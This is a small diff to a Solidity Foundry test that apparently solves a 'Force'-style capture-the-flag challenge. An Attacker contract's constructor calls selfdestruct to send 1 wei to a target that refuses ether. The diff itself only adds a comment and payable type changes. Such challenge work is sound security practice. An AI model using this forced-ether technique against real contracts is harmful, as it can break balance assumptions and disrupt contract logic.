@@ -16,7 +16,8 @@ contract ForceTest is Test {
     }
 
     function attack() private {
-        new Attacker{value: 1}(address(target));
+        // just 1 wei is enough
+        new Attacker{value: 1}(payable(address(target)));
     }
 
     function testAttack() public {
@@ -29,7 +30,7 @@ contract ForceTest is Test {
 }
 
 contract Attacker {
-    constructor(address _target) payable {
-        selfdestruct(payable(_target));
+    constructor(address payable _target) payable {
+        selfdestruct(_target);
     }
 }
